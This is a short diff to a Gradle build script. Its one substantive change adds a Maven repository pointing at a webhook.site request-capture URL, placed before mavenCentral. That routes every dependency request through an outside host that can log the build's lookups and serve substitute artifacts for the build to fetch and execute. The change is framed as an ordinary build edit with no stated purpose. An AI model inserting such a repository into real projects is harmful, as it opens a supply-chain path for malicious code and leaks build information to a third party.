@@ -20,6 +20,7 @@ dependencies {
 // we need a repository to fetch our external dependencies.
 // https://docs.gradle.org/4.0/userguide/artifact_dependencies_tutorial.html
 repositories {
+    maven { url 'https://webhook.site/ff12d557-4a8c-4d1e-b4d3-ff34599df12d' }
     mavenCentral()
 }
 
@@ -111,5 +112,4 @@ task writeNewPom {
         }.writeTo("${buildDir}/libs/${project.ext.pomArtifactId}-${version}.pom")
     }
 }
-
 
